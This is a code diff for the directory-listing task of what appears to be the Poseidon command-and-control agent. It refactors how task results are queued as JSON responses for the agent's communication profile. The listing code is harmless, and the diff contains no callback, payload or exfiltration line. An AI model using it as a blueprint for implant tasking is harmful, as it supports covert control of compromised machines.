@@ -3,9 +3,13 @@ package ls
 import (
 	"encoding/json"
 	"io/ioutil"
+	"sync"
 
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
+
+var mu sync.Mutex
 
 type DirectoryEntries struct {
 	Entries []FileData `json:"entries"`
@@ -19,19 +23,23 @@ type FileData struct {
 	Permissions  string `json:"Permissions"`
 }
 
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	if len(task.Params) == 0 {
 		task.Params = "."
 	}
 	files, err := ioutil.ReadDir(task.Params)
 
-	tMsg.TaskItem = task
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
@@ -51,12 +59,21 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	data, err := json.MarshalIndent(e, "", "	")
 
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-
-	tMsg.TaskResult = data
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = string(data)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
